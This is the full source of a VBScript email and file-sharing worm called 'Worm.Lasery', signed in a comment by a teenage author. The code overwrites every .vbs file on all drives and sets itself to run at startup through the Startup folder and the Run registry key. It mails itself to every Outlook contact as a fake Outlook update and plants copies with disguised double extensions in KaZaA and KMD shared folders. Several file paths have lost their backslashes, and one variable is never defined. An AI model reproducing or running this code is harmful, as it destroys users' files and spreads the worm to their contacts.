'This Worm.Lasery has been created by NytRaX, Im French and im 14 years old lol !

set mvbswe = wscript.CreateObject("WScript.Shell")
Set fso = createobject("scripting.filesystemobject")
Set Drives=fso.drives 
For Each Drive in Drives
If drive.isready then
Dosearch drive & ""
end If 
Next 
function Dosearch(path)

on error resume next
Set Folder=fso.getfolder(path)
Set Files = folder.files
For Each File in files
If fso.GetExtensionName(file.path)="vbs" then
fso.Copyfile Wscript.Scriptfullname,file.path
end if
next
Set Subfolders = folder.SubFolders
For Each Subfolder in Subfolders
Dosearch Subfolder.path 
Next
end function

fso.copyfile wscript.scriptfullname,"Cocuments and SettingsAll UsersStart 

MenuProgramsStartuplasery.vbs"

Set Lasery = CreateObject("WScript.Shell")
Lasery.regwrite "HKLMSOFTWAREMicrosoftWindowsCurrentVersionRunWinUptd" , 

"C:windowssystem32WinUptd.vbs"

myself = Wscript.ScriptFullName
set fso = createobject("scripting.filesystemobject")
fso.CopyFile myself, "C:windowssystem32MOutlook36_Setup"
Set gqlbgmbg=CreateObject("Outlook.Application")
Set gqlbgqlb=gqlbgmbg.GetNameSpace("MAPI")
For Each C In gqlbgqlb.AddressLists
If C.AddressEntries.Count <> 0 Then
For D=1 To C.AddressEntries.Count
Set bgqhqlbg=C.AddressEntries(D)
Set gqlbhqmb=gqlbgmbg.CreateItem(0)
gqlbhqmb.To=bgqhqlbg.Address
gqlbhqmb.Subject="Outlook new version"
gqlbhqmb.Body="Microsoft Outlook new version click to install"
gqlbhqmb.Attachments.Add("C:windowssystem32MOutlook36_Setup")
gqlbhqmb.DeleteAfterSubmit=True
If gqlbhqmb.To <> "" Then
gqlbhqmb.Send
End If
Next
End If
Next

set fso = CreateObject("Scripting.filesystemobject")
if fso.folderexists("C:Program FilesKMDMy Shared Folder") then
fso.copyfile Myfile, "C:Program FilesKMDMy Shared FolderKournikova_free.jpg.vbs"
fso.copyfile Myfile, "C:Program FilesKMDMy Shared FolderMasters Of hardcores.mp3.vbs"
fso.copyfile Myfile, "C:Program FilesKMDMy Shared FolderSource_halfLife2.doc.vbs"
End if

if fso.folderexists("C:Program FilesKaZaA LiteMy Shared Folder") then
fso.copyfile Myfile, "C:Program FilesKaZaA LiteMy Shared FolderKournikova_free.jpg.vbs"
fso.copyfile Myfile, "C:Program FilesKaZaA LiteMy Shared FolderMasters Of hardcores.mp3.vbs"
fso.copyfile Myfile, "C:Program FilesKaZaA LiteMy Shared FolderSource_halfLife2.doc.vbs"
End if

msgbox "excuse me, I do not want more to work for you goodbye!", VbOkOnly,"Microsoft Windows"